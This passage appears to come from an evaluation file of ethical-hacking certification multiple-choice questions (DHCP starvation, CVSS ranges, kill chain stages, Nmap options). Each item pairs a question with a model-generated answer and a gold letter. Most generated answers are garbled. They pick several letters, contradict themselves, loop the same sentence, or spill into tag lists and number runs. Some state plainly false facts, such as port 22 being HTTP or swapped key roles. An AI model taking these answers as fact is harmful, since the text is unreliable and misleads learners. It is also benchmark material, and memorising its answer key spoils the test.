+the accuracy and accountability of corporate disclosures. It covers accounting firms and third parties that
+provide financial services to some organizations and came into effect in 2002. This law is known by what
+acronym?
+A.  Fed RAMP
+B.  PCIDSS
+C.  SOX
+D.  HIPAA
+","This is a question about cybersecurity. Please write an answer.
+
+ C. Sarbanes-Oxley Act of 2002 (SOX) is a law that is designed to improve the accuracy and accountability of corporate
+disclosures. The law is a result of the Enron scandal and the WorldCom and Tyco scandals. It is enforced by the
+Securities and Exchange Commission (SEC) and is designed to protect investors from fraud and make sure that
+companies are accurately reporting their financial statements.
+A is incorrect because Fed RAMP is a regulation that is enforced by the Federal Reserve. Fed RAMP does not
+require companies to use third-party auditing firms.
+B is incorrect because PCI DSS is a security standard that is enforced by the PCI Security Standards Council. It is
+designed to protect credit card information from being stolen. PCI DSS is not a law.
+D is incorrect because HIPAA is a law that is enforced by the U.S. Department of Health and Human",C
+38,"Jim, a professional hacker, targeted an organization that is operating critical Industrial Infrastructure. Jim used
+Nmap to scan open pons and running services on systems connected to the organization's OT network. He
+used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered
+Information such as the vendor name, product code and name, device name, and IP address. Which of the
+following Nmap commands helped Jim retrieve the required information?
+A.  nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >
+B.  nmap -Pn -sU -p 44818 --script enip-info < Target IP >
+C.  nmap -Pn -sT -p 46824 < Target IP >
+D.  nmap -Pn -sT -p 102 --script s7-info < Target IP >
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D. Nmap uses the -sT option to scan for TCP ports. It does not use -Pn to scan for UDP ports.
+Nmap uses -sU to scan for UDP ports. -Pn is used to scan for TCP ports. -sT scans for TCP ports, and -sU scans for UDP ports.
+Nmap uses the -sT option to scan for TCP ports. -sU scans for UDP ports. -Pn is used to scan for TCP ports.
+Nmap uses the -sU option to scan for UDP ports. -Pn is used to scan for TCP ports. -sT scans for TCP ports, and -sU scans for UDP ports.
+A, B, D. Nmap uses the -sT option to scan for TCP ports. It does not use -Pn to scan for UDP ports.
+Nmap uses -",B
+39,"Abel, a security professional, conducts penetration testing in his client organization to check for any security
+loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all
+the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This
+led to a Dos attack, and as a result, legitimate employees were unable to access the clients network. Which of
+the following attacks did Abel perform in the above scenario?
+A.  VLAN hopping
+B.  DHCP starvation
+C.  Rogue DHCP server attack
+D.  STP attack
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. This is a simple Dos attack. A DHCP server is used to assign IP addresses to computers, and a hacker can
+launch a DOS attack by flooding the DHCP server with so many requests that it can no longer handle them. The
+server will eventually crash and, as a result, legitimate users will be unable to access the network.
+C is incorrect because this is not a STP attack. STP is a network management protocol that controls the
+network, not a DOS attack. The STP attack is used to disable a switch, not the DHCP server.
+A, B, and D are incorrect because these are not the types of attacks that would be performed in this scenario. A VLAN
+hopping attack is used to get around a firewall, and the STP attack is used to disable a switch. A rogue DHCP
+server attack is used to spoof DHCP responses and make the server assign addresses",B
+40,"""Testing the network using the same methodologies and tools employed by attackers""
+
+Identify the correct terminology that defines the above statement.
+A.  Vulnerability Scanning
+B.  Penetration Testing
+C.  Security Policy Implementation
+D.  Designing Network Security
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D.  Vulnerability scanning is a term that refers to the process of using automated tools to identify vulnerabilities in a target system. Penetration testing, on the other hand, refers to the process of using human testers to exploit vulnerabilities in a system. Security policy implementation is the process of creating, implementing, and enforcing security policies. Designing network security is the process of creating a plan to secure a network. The term vulnerability scanning does not refer to the process of testing the network using the same methodologies and tools employed by attackers. Vulnerability scanning is a process of using automated tools to identify vulnerabilities in a target system. Penetration testing, on the other hand, refers to the process of using human testers to exploit vulnerabilities in a system. Security policy implementation is the process of creating, implementing, and enforcing security policies. Designing network security is the process of creating a plan to secure a network. The",B
+41,"in the Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, what range does medium
+vulnerability fall in?
+A.  3.0-6.9
+B.  40-6.0
+C.  4.0-6.9
+D.  3.9-6.9
+","Tags: CVSS, scoring, vulnerability, score, severity, CVSS, v3.1, severity, ratings, medium, range, vulnerability, range, scoring, score, vulnerability, CVSS, scoring, severity, ratings, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security, security",C
+42,"In the field of cryptanalysis, what is meant by a ?rubber-hose"" attack?
+A.  Attempting to decrypt cipher text by making logical assumptions about the contents of the original plaintext.
+B.  Extraction of cryptographic secrets through coercion or torture.
+C.  Forcing the targeted key stream through a hardware-accelerated device such as an ASIC.
+D.  A backdoor placed into a cryptographic algorithm by its creator.
+","defining the algorithm in a way that is not obvious to the intended recipient. For example, the
+rubber hose attack can be used to extract the key stream from a block cipher, or to extract
+the key from a stream cipher. The key stream is the sequence of random bits that the
+ciphertext is generated by the algorithm, and the rubber hose attack can be used to force the
+targeted key stream through a hardware-accelerated device such as an ASIC. The backdoor
+attack is used to place a backdoor into a cryptographic algorithm by its creator, which can be
+used to extract the key stream from the algorithm. The key stream is the sequence of random bits
+that the ciphertext is generated by the algorithm, and the backdoor can be used to force the
+targeted key stream through a hardware-accelerated device such as an ASIC. The key stream is
+the sequence of random bits that the ciphertext is generated by the algorithm, and",B
+43,"The network team has well-established procedures to follow for creating new rules on the firewall. This
+includes having approval from a manager prior to implementing any new rules. While reviewing the firewall
+configuration, you notice a recently implemented rule but cannot locate manager approval for it. What would
+be a good step to have in the procedures for a situation like this?
+A.  Have the network team document the reason why the rule was implemented without prior manager approval.
+B.  Monitor all traffic using the firewall rule until a manager can approve it.
+C.  Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.
+D.  Immediately roll back the firewall rule until a manager can approve it
+","The best way to handle this is to have the network team document the reason why the rule was implemented without
+prior manager approval. Then, you can go back to the manager and ask for approval. It’s better to have the rule
+in place for a longer period of time than to have it implemented without approval. In this case, it’s better to have
+the rule in place for a longer period of time so the business can have a chance to make a decision on whether
+they want to implement the rule or not. If they do, they can then implement it without manager approval.
+B is incorrect because this is not a good way to have the rule implemented. The network team should have
+approval from the manager for all rules. It’s not something the network team can roll back. If you can’t get
+manager approval, you’re better off not implementing the rule. C is incorrect because this is not a good way to
+have the rule implemented. The network team",D
+44,"Susan, a software developer, wants her web API to update other applications with the latest information. For
+this purpose, she uses a user-defined HTTP tailback or push APIs that are raised based on trigger events: when
+invoked, this feature supplies data to other applications so that users can instantly receive real-time
+Information.
+Which of the following techniques is employed by Susan?
+A.  web shells
+B.  Webhooks
+C.  REST API
+D.  SOAP API
+","The webhooks feature is a way to trigger an action on the server side. It’s a push API that allows the client to
+send information to the server when something happens. It’s a very common use case for webhooks, but not the only one. It
+can also be used for push-based notifications and scheduled tasks. For example, you can use a webhook to
+send an email notification to a recipient when a particular event occurs. Webhooks are a great way to notify
+people when something happens, and they are a great way to automate tasks. They are not a way to pull information
+from the server to the client. They are a way to send information from the client to the server.
+A web shell is a way to gain access to the server side of an application, and it’s a great way to attack
+applications. Web shells can be used for many different things, but they are not a way to pull information
+from the server to the client.",B
+45,"What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack against an
+organization?
+A.  The attacker queries a nameserver using the DNS resolver.
+B.  The attacker makes a request to the DNS resolver.
+C.  The attacker forges a reply from the DNS resolver.
+D.  The attacker uses TCP to poison the ONS resofver.
+","Question:
+ C. The attacker forges a reply from the DNS resolver. This is the first step in a DNS cache poisoning attack.
+The attacker is making a request to the resolver. The resolver will send a query to a nameserver and the
+nameserver will send back a response. The response will be forged by the attacker, and the response will
+be sent back to the resolver. The resolver will then forward the response to the client, and the client will
+then send the response back to the attacker. The attacker will have successfully poisoned the cache. The
+DNS cache poisoning attack is a common attack that exploits a vulnerability in the DNS resolver to
+cause a false response to be sent back to the client. The attacker can use this response to perform
+a variety of attacks, including a denial of service attack, a man-in-the-middle attack, and a redirect
+attack. The attacker can also use this to cause a false address to be returned to the client, and the",B
+46,"Ricardo has discovered the username for an application in his targets environment. As he has a limited amount
+of time, he decides to attempt to use a list of common passwords he found on the Internet. He compiles them
+into a list and then feeds that list as an argument into his password-cracking application, what type of attack is
+Ricardo performing?
+A.  Known plaintext
+B.  Password spraying
+C.  Brute force
+D.  Dictionary
+","Question: C. The dictionary attack is used when a list of words is fed into a password-cracking tool. The tool
+will then attempt to guess the password by using the list of words as input. The application will then check
+the passwords for a match, and if there is a match, the program will continue. The tool will continue until
+it finds a match or until the list of words is exhausted. If it exhausts the list, it will then return an error. The
+application will then move to the next word in the list. If it finds a match, the program will continue to the next
+word until it exhausts the list. If it exhausts the list and the password does not match, it will return an error. The
+application will then move to the next word in the list.
+A is incorrect because a known plaintext attack is performed when a list of words is fed into a password-cracking
+tool, and the tool will attempt to",D
+47,"Sam is working as a system administrator In an organization. He captured the principal characteristics of a
+vulnerability and produced a numerical score to reflect Its severity using CVSS v3.0 to property assess and
+prioritize the organization's vulnerability management processes. The base score that Sam obtained after
+performing cvss rating was 4.0. What is the CVSS severity level of the vulnerability discovered by Sam in the
+above scenario?
+A.  Medium
+B.  Low
+C.  Critical
+D.  High
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D. The CVSS severity level of a vulnerability is determined by its score. The score is a numeric value that
+is used to determine the level of severity of the vulnerability. The CVSS severity level of a vulnerability can range
+from 0 to 10. A score of 0 is the lowest severity level, and a score of 10 is the highest severity level. The
+CVSS severity level of a vulnerability is determined by the score and the CVSS vector. A score of 4.0 means the
+vulnerability is a medium severity vulnerability. A score of 8.0 means the vulnerability is a critical severity
+vulnerability. A score of 10.0 means the vulnerability is a high severity vulnerability. A score of 0 means the
+vulnerability is a low severity vulnerability. The CVSS severity level is determined by the score and the vector",A
+48,"How is the public key distributed in an orderly, controlled fashion so that the users can be sure of the sender?s
+identity?
+A.  Hash value
+B.  Private key
+C.  Digital signature
+D.  Digital certificate
+","The public key is distributed in a controlled fashion so that the users can be sure of the sender’s identity. The digital
+signature is the digital equivalent of a handwritten signature, and the digital certificate is the digital equivalent of a
+physical certificate. The hash value is the hash of the public key. The private key is the secret key that is used to
+encrypt and decrypt messages.",D
+49,"At what stage of the cyber kill chain theory model does data exfiltration occur?
+A.  Actions on objectives
+B.  Weaponization
+C.  installation
+D.  Command and control
+","#A. In the initial phase of the kill chain, the adversary is collecting information about the target and
+the target’s environment. The data collection stage is accomplished by the use of social engineering, which
+includes spear phishing, spear phishing, phishing, and vishing. Once the target is identified, the adversary
+will begin to develop a plan to attack the target. At this stage, the adversary will begin to use
+malware to infect the target’s system. During this stage, the adversary will also begin to build a command and
+control infrastructure, which will be used to communicate with the target. At this stage, the adversary will also
+begin to build a backdoor on the target’s system, which will allow the adversary to remotely control the
+target’s system. At this stage, the adversary will begin to build a botnet, which will be used to launch
+DDoS attacks. At this stage, the adversary will begin to develop a payload that will be used",A
+50,"Steven connected his iPhone to a public computer that had been infected by Clark, an attacker. After
+establishing the connection with the public computer, Steven enabled iTunes WI-FI sync on the computer so
+that the device could continue communication with that computer even after being physically disconnected.
+Now, Clark gains access to Steven?s iPhone through the infected computer and is able to monitor and read all
+of Steven?s activity on the iPhone, even after the device is out of the communication zone.
+Which of the following attacks is performed by Clark in above scenario?
+A.  IOS trustjacking
+B.  lOS Jailbreaking
+C.  Exploiting SS7 vulnerability
+D.  Man-in-the-disk attack
+","Question:
+ A, B, D. This attack is a man-in-the-disk attack. A man-in-the-disk attack is a way to get access to a system
+by connecting to it through the operating system’s file system. The attacker can use this to gain access to
+the system without any user interaction. This is accomplished by using the operating system’s file system to
+send a series of requests to the system that can be interpreted by the operating system as legitimate requests.
+The operating system then opens the file and allows the attacker to access the system without user interaction.
+The attack is a man-in-the-disk attack because the attacker does not use a network connection to gain access.
+A man-in-the-middle attack is a type of attack in which the attacker sits in the middle of a communication
+exchange between two parties and eavesdrops on the communication. This attack can be used in various ways.
+One way is to use a man-in-the-middle attack to gain access to",A
+51,"During the process of encryption and decryption, what keys are shared?
+A.  Private keys
+B.  User passwords
+C.  Public keys
+D.  Public and private keys
+",The private key is used to encrypt the message. The public key is used to decrypt the message. The public key is used to encrypt the message. The private key is used to decrypt the message. The private key is used to decrypt the message. The public key is used to encrypt the message. The private key is used to encrypt the message. The public key is used to decrypt the message. The private key is used to decrypt the message. The public key is used to encrypt the message. The private key is used to encrypt the message. The public key is used to decrypt the message. The private key is used to encrypt the message. The public key is used to decrypt the message. The private key is used to encrypt the message. The public key is used to encrypt the message. The private key is used to decrypt the message. The public key is used to decrypt the message. The private key is used to encrypt the message. The public key is used to encrypt the message,C
+52,"Abel, a cloud architect, uses container technology to deploy applications/software including all its
+dependencies, such as libraries and configuration files, binaries, and other resources that run independently
+from other processes in the cloud environment. For the containerization of applications, he follows the five-tier
+container technology architecture. Currently. Abel is verifying and validating image contents, signing images,
+and sending them to the registries. Which of the following tiers of the container technology architecture Is
+Abel currently working in?
+A.  Tier-1: Developer machines
+B.  Tier-4: Orchestrators
+C.  Tier-3: Registries
+D.  Tier-2: Testing and accreditation systems
+","This is a question about cybersecurity. Please write an answer.
+
+### A, B, D. E. E. The five-tier container architecture is used for deploying applications in the cloud. Tier-1 is the
+developer machines. Tier-4 is the orchestrators. Tier-2 is the registries. Tier-3 is the testing and accreditation
+systems. Tier-4 is the registries. Tier-2 is the testing and accreditation systems. The registries are used to store
+images. The orchestrators are used to orchestrate the deployment of applications and services. The testing and
+accreditation systems are used for testing and accreditation of the applications. This is a simplified view of the
+five-tier architecture, but it’s an accurate one. It is not a technical term. The registry is the place where the
+images are stored. The orchestrators are used to orchestrate the deployment of applications and services. The
+testing and accreditation systems are used for testing and accreditation",D
+53,"What do Trinoo, TFN2k, WinTrinoo, T-Sight, and Stracheldraht have in common?
+A.  All are hacking tools developed by the legion of doom
+B.  All are tools that can be used not only by hackers, but also security personnel
+C.  All are DDOS tools
+D.  All are tools that are only effective against Windows
+E.  All are tools that are only effective against Linux
+","We’re going to go through the list of tools in reverse order. TFN2k is a WinTrinoo
+tool that can be used to attack Windows systems. WinTrinoo is a Windows tool that can be used to
+attack Windows systems. Stracheldraht is a Linux tool that can be used to attack Linux systems. T-Sight
+is a tool that can be used to attack Linux systems. T-Sight is a tool that can be used to attack Linux
+systems. It’s not a DDOS tool, nor is it a Windows tool. DDOS is short for distributed denial-of-service, and
+it’s a term for a group of tools that can be used to attack systems. A DDOS tool is a tool that can be used
+to attack multiple systems. This is not a Linux tool. Linux is a system that can be attacked. A tool that
+can be used to attack Linux systems is T-Sight. It’s not",C
+54,"Larry, a security professional in an organization, has noticed some abnormalities In the user accounts on a web
+server. To thwart evolving attacks, he decided to harden the security of the web server by adopting a
+countermeasures to secure the accounts on the web server.
+Which of the following countermeasures must Larry implement to secure the user accounts on the web server?
+A.  Enable unused default user accounts created during the installation of an OS
+B.  Enable all non-interactive accounts that should exist but do not require interactive login
+C.  Limit the administrator or toot-level access to the minimum number of users
+D.  Retain all unused modules and application extensions
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D. All of the choices are incorrect. The enable-all-default-user-accounts-created-during-the-installation-of-an-os option is not a countermeasure to secure user accounts on a web server. The enable-all-non-interactive-accounts-that-should-exist-but-do-not-require-interactive-login option is not a countermeasure to secure user accounts on a web server. The limit-the-administrator-toot-level-access-to-the-minimum-number-of-users option is not a countermeasure to secure user accounts on a web server. The retain-all-unused-modules-and-application-extensions option is not a countermeasure to secure user accounts on a web server. The enable-all-privileged-user-accounts option is not a countermeasure to secure user accounts on a web server. The enable-privileged-user-accounts option is not a countermeasure to secure user accounts on a web server. The enable-privileged-user",C
+55,"In order to tailor your tests during a web-application scan, you decide to determine which web-server version
+is hosting the application. On using the sV flag with Nmap. you obtain the following response:
+80/tcp open http-proxy Apache Server 7.1.6
+what Information-gathering technique does this best describe?
+A.  WhOiS lookup
+B.  Banner grabbing
+C.  Dictionary attack
+D.  Brute forcing
+","# A. In order to determine which web-server version is hosting the application, you can use the sV flag with Nmap. This
+flag will display the version information on the server, as well as the operating system. This is the same technique used
+by the WhoiS lookup utility. If you want to see the version number, you would use the sV flag with the
+sV2 flag. The sV2 flag will display the version number and operating system. If you want to see the operating
+system, you would use the OS flag. If you want to see the version number and operating system, you would use
+the OS flag with the sV2 flag. The sV2 flag will display the version number and operating system. The sV
+flag will display the version number. A dictionary attack is a word-guessing technique where you use a dictionary of common
+words to guess the password. Brute forcing is a word-guess",B
+56,"what is the port to block first in case you are suspicious that an loT device has been compromised?
+A.  22
+B.  443
+C.  48101
+D.  80
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D. The 22 port is the standard for HTTP and is used for all web traffic. The 80 port is used for SMTP (mail) traffic. The 443 port is used for HTTPS (HTTPs) traffic. The 48101 port is used for file transfer protocol (FTP). The 22 port is used for SSH (secure shell). The 443 port is used for HTTPS traffic. The 80 port is used for SMTP traffic. The 48101 port is used for FTP traffic. The 22 port is used for SSH traffic. The 443 port is used for HTTPS traffic. The 80 port is used for SMTP traffic. The 48101 port is used for FTP traffic. The 22 port is used for SSH traffic. The 443 port is used for HTTPS traffic. The 80 port is used for SMTP traffic. The 48101 port is used",C
+57,"A newly joined employee. Janet, has been allocated an existing system used by a previous employee. Before
+issuing the system to Janet, it was assessed by Martin, the administrator. Martin found that there were
+possibilities of compromise through user directories, registries, and other system parameters. He also
+Identified vulnerabilities such as native configuration tables, incorrect registry or file permissions, and
+software configuration errors. What is the type of vulnerability assessment performed by Martin?
+A.  Credentialed assessment
+B.  Database assessment
+C.  Host-based assessment
+D.  Distributed assessment
+","Tags: 2. Host-based assessment. Martin was assessing the system as part of the initial security review and
+intended to identify potential vulnerabilities and security issues. In this case, the assessment was
+conducted by the administrator. The assessment involved analyzing the system’s configuration, registry,
+and other system parameters to identify vulnerabilities. The system would also be tested to determine if it
+was running any native configuration tables. The system would be assessed to see if it was set up correctly
+with regards to user directories, registries, and other system parameters. The system would also be tested
+to see if it was set up correctly with regards to software configuration errors. The system would be
+tested to see if it was running any native configuration tables. The system would be tested to see if it was set up
+correctly with regards to user directories, registries, and other system parameters. The system would also
+be tested to see if it was set up correctly with regards to software",C
+58,"You are a penetration tester working to test the user awareness of the employees of the client xyz. You
+harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to
+the employees via email. Which stage of the cyber kill chain are you at?
+A.  Reconnaissance
+B.  Command and control
+C.  Weaponization
+D.  Exploitation
+","The client-side backdoor is at the exploitation stage of the cyber kill chain. The client-side backdoor is
+a client-side script that is used to communicate with a server. The server-side backdoor is used to communicate with
+a server, and the server-side backdoor is used to communicate with the server. The server-side backdoor is the
+last stage of the cyber kill chain and is the most important stage. The client-side backdoor is the first stage of the
+kill chain. The command and control stage is the stage where the attacker uses a command and control server to
+communicate with the server. The exploitation stage is the stage where the attacker uses exploits to exploit a vulnerability.
+The exploitation stage is the stage where the attacker uses the exploit to gain access to the target system.
+Exploitation is the stage where the attacker uses the exploit to gain access to the target system. Exploitation is
+the stage where the attacker uses the exploit to gain access to",C
+59,"Which file is a rich target to discover the structure of a website during web-server footprinting?
+A.  Document root
+B.  Robots.txt
+C.  domain.txt
+D.  index.html
+","Question:  C.  The domain.txt file is a file used to inform robots that the site is a web server, and not a directory, and it’s a good target for web server footprinting.  The document root is the directory that contains all of the web files, and the index.html file is the default page for a website.  The robots.txt file is used to inform search engines what pages are allowed to crawl, and it’s not a good target for web server footprinting.  The file that contains the robots.txt file is called robots.txt.  If you want to know more about this file, check out the W3C website.  http://www.w3.org/MarkUp/Robots.html.  The robots.txt file is used to inform search engines what pages are allowed to crawl, and it’s not a good target for web server footprinting.  The domain.txt file is used to inform search engines what pages are allowed to crawl, and",B
+60,"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on
+the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained
+the list of the users who are currently accessing the network. What is the type of vulnerability assessment that
+Morris performed on the target organization?
+A.  internal assessment
+B.  Passive assessment
+C.  External assessment
+D.  Credentialed assessment
+","# B. Internal assessment is the term used to describe an assessment of the internal workings of a system or
+organization. In this case, Morris was sniffing the network to see what applications were running on the
+systems and what services were being used. This is an internal assessment. A passive assessment is when a
+sniffer is used to gather information about the network, without the user being aware of it. An external
+assessment is when the user is aware of the assessment taking place and is aware of the information being
+gathered. A credentialed assessment is when the user is aware of the assessment taking place and has
+access to the information being gathered. In this case, Morris was a hacker, so he was not aware of the
+assessment taking place. He was also not credentialed, so he did not have access to the information.
+A passive assessment is when a sniffer is used to gather information about the network without the user being
+aware of",B
+61,"jane, an ethical hacker. Is testing a target organization's web server and website to identity security loopholes.
+In this process, she copied the entire website and its content on a local drive to view the complete profile of the
+site's directory structure, file structure, external links, images, web pages, and so on. This information helps
+jane map the website's directories and gain valuable information. What is the attack technique employed by
+Jane in the above scenario?
+A.  website mirroring
+B.  Session hijacking
+C.  Web cache poisoning
+D.  Website defacement
+","This is a classic social engineering attack, and the web server and website are the target. The target is copied
+to a local drive, and the entire website is examined to gain information about the directory structure, file
+structure, external links, images, web pages, and so on. The information is then analyzed and used to map out the
+site’s directories and gain valuable information. The site is then defaced to make the attack more complete and
+the site owner more likely to be found. Web cache poisoning is not an attack technique used in this scenario.
+A, B, D. Social engineering is a form of attack in which the attacker impersonates a legitimate user or organization to
+obtain sensitive information from the victim. In this scenario, Jane is impersonating the target organization and
+copying the entire website to a local drive, which is then analyzed and used to map out the site’s directories and
+gain valuable information.",A
+62,"What information security law or standard aims at protecting stakeholders and the general public from
+accounting errors and fraudulent activities within organizations?
+A.  PCI-DSS
+B.  FISMA
+C.  SOX
+D.  ISO/I EC 27001:2013
+","Tags: Information Security, Information Security Law, Information Security Standards, Security Standards, Security Standards Council, Security Standards Organization, SOC, SOC2, SOC3, SOC4, SOC5, SOC6, SOC7, SOC8, SOC9, SOC10, SOC11, SOC12, SOC13, SOC14, SOC15, SOC16, SOC17, SOC18, SOC19, SOC20, SOC21, SOC22, SOC23, SOC24, SOC25, SOC26, SOC27, SOC28, SOC29, SOC30, SOC31, SOC32, SOC33, SOC34, SOC35, SOC36, SOC37, SOC38, SOC39, SOC40, SOC41, SOC42, SOC43, SOC44, SOC45, SOC46, SOC47, SOC48, SOC49, SOC50, SOC51, SOC52, SOC53, SOC54, SOC55, SOC56, SOC57, SOC58, SOC59",C
+63,"CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed
+Bob, a security professional, to build and incorporate defensive strategies against such attacks. Bob adopted a
+practice whereby only a list of entities such as the data type, range, size, and value, which have been approved
+for secured access, is accepted. What is the defensive technique employed by Bob in the above scenario?
+A.  Output encoding
+B.  Enforce least privileges
+C.  Whitelist validation
+D.  Blacklist validation
+","Tags: SQL injection, whitelist, blacklist, least privileges, whitelist, blacklist, output encoding, whitelist validation,
+blacklist validation, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection, SQL injection",C
+64,"A security analyst uses Zenmap to perform an ICMP timestamp ping scan to acquire information related to the
+current time from the target host machine.
+Which of the following Zenmap options must the analyst use to perform the ICMP timestamp ping scan?
+A.  -PY
+B.  -PU
+C.  -PP
+D.  -Pn
+","Question: C. The -Pn option is used to ping a target host and receive the current time. The -PY option is used to ping
+a target host and send the timestamp back to the source host. The -PP option is used to ping a target host and
+send the timestamp back to the source host. The -Pn option is used to ping a target host and receive the timestamp.
+A, B, D, E are incorrect because these options are not valid for the Zenmap ICMP ping scan. The -PY option is used to
+ping a target host and receive the timestamp back from the target host. The -PP option is used to ping a target host
+and send the timestamp back to the source host. The -Pn option is used to ping a target host and send the
+timestamp back to the source host. The -P option is used to ping a target host and receive the timestamp. The -PY
+option is used to ping a",C
+65,"Which of the following antennas is commonly used in communications for a frequency band of 10 MHz to
+VHF and UHF?
+A.  Yagi antenna
+B.  Dipole antenna
+C.  Parabolic grid antenna
+D.  Omnidirectional antenna
+",defuse.5. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 58. 59. 60. 61. 62. 63. 64. 65. 66. 67. 68. 69. 70. 71. 72. 73. 74,A
+66,"Jack, a professional hacker, targets an organization and performs vulnerability scanning on the target web
+server to identify any possible weaknesses, vulnerabilities, and misconfigurations. In this process, Jack uses an
+automated tool that eases his work and performs vulnerability scanning to find hosts, services, and other
+vulnerabilities in the target server. Which of the following tools is used by Jack to perform vulnerability
+scanning?
+A.  Infoga
+B.  WebCopier Pro
+C.  Netsparker
+D.  NCollector Studio
+","A.  Infoga is a tool that scans for open ports, services, and other vulnerabilities in a target system. It is an automated
+tool that can be used to scan a target system for vulnerabilities. It is not a vulnerability scanner. In addition, it is not a
+tool that performs vulnerability scanning. WebCopier Pro is a tool that is used to capture web pages from a target system.
+Netsparker is a vulnerability scanner. NCollector Studio is a vulnerability scanner. It is not a tool that performs
+vulnerability scanning. It is a tool that is used to monitor systems for security threats. It is not a vulnerability scanner.
+In this question, the tool is not performing vulnerability scanning. Infoga is a tool that can be used to scan for open ports,
+services, and other vulnerabilities in a target system. It is not a vulnerability scanner.
+A vulnerability scanner is a tool that",C
+67,"in this attack, an adversary tricks a victim into reinstalling an already-in-use key. This is achieved by
+manipulating and replaying cryptographic handshake messages. When the victim reinstall the key, associated
+parameters such as the incremental transmit packet number and receive packet number are reset to their initial
+values. What is this attack called?
+A.  Chop chop attack
+B.  KRACK
+C.  Evil twin
+D.  Wardriving
+","The KRACK attack is a man-in-the-middle attack that takes advantage of a vulnerable Wi-Fi device with an
+unprotected WPA-PSK (pre-shared key) connection. The attack takes advantage of a vulnerability in the
+wpa_cli utility on the Linux operating system. The exploit is replayed in the middle of a handshake between
+the client and the access point to force the client to accept the handshake with the compromised device. The
+client will then send a response to the attack and the response will be replayed back to the compromised device.
+The client will accept the handshake and then install a new key. The original key is then used in the
+next handshake and so on. The attack is replaying the handshake message to trick the client into thinking it
+is communicating with a valid device.
+A is incorrect because the chop chop attack does not take advantage of a vulnerability in the Wi-Fi protocol.
+B is incorrect because the wardriving attack does not take advantage of",B
+68,"Which among the following is the best example of the third step (delivery) in the cyber kill chain?
+A.  An intruder sends a malicious attachment via email to a target.
+B.  An intruder creates malware to be used as a malicious attachment to an email.
+C.  An intruder's malware is triggered when a target opens a malicious email attachment.
+D.  An intruder's malware is installed on a target's machine.
+","This is a classic example of the third step of the cyber kill chain. The intruder sends the malicious attachment to a target. The target opens the attachment and the malware is executed. The malware then goes to work. The target is infected. The third step is the delivery phase. This is also known as the “delivery phase” in some security books. The attacker is sending the email, and the target is opening the email and opening the attachment. The malware is executed, and the intruder is in. The third step is the execution phase. This is the point where the intruder is in control of the target’s machine. The target is infected and the intruder is in. The third step is the execution phase. The attacker is in control of the target’s machine. This is also known as the “execution phase” in some security books. The attacker is in control of the target’s machine. The third step is the execution phase. This is the point where the intr",A
+69,"_________ is a type of phishing that targets high-profile executives such as CEOs, CFOs, politicians, and
+celebrities who have access to confidential and highly valuable information.
+A.  Spear phishing
+B.  Whaling
+C.  Vishing
+D.  Phishing
+","This is a question about cybersecurity. Please write an answer.
+
+ B. Whaling is a form of spear phishing that targets high-profile executives such as CEOs, CFOs, politicians, and celebrities who have access to confidential and highly valuable information. This is a common tactic used by cybercriminals because of the high profile of the targets. Whaling is a form of social engineering, and it is a subset of spear phishing, which targets individuals rather than organizations. A whaler will send an email that appears to be from a legitimate organization, and then ask for login credentials or other sensitive information. Whaling is a form of spear phishing, and it is a subset of spear phishing, which targets individuals rather than organizations. Whaling is a form of social engineering, and it is a subset of spear phishing, which targets individuals rather than organizations. A whaler will send an email that appears to be from a legitimate organization, and then ask for login credentials or other sensitive information. This is a",B
+70,"Josh has finished scanning a network and has discovered multiple vulnerable services. He knows that several
+of these usually have protections against external sources but are frequently susceptible to internal users. He
+decides to draft an email, spoof the sender as the internal IT team, and attach a malicious file disguised as a
+financial spreadsheet. Before Josh sends the email, he decides to investigate other methods of getting the file
+onto the system. For this particular attempt, what was the last stage of the cyber kill chain that Josh
+performed?
+A.  Exploitation
+B.  Weaponization
+C.  Delivery
+D.  Reconnaissance
+","Question:
+ C. The last stage of the kill chain is the delivery phase. This is the phase in which the attacker sends the
+malicious payload to the target system. In this case, Josh is sending a malicious file to the internal IT team.
+The other stages in the kill chain include reconnaissance, exploitation, and weaponization. Exploitation is the
+phase in which the attacker finds a vulnerability and exploits it to gain access to the system. Weaponization is the
+phase in which the attacker creates a payload and sends it to the target system. Delivery is the phase in which the
+payload is sent to the target system. The kill chain is a diagrammatic representation of the stages of a cyber
+attack. The stages are not necessarily in a linear order, but they are intended to be used as a guide.
+A is incorrect because the exploitation phase does not exist.
+D is incorrect because recon is the phase in which the attacker does research to gather information about the target.
+B",B
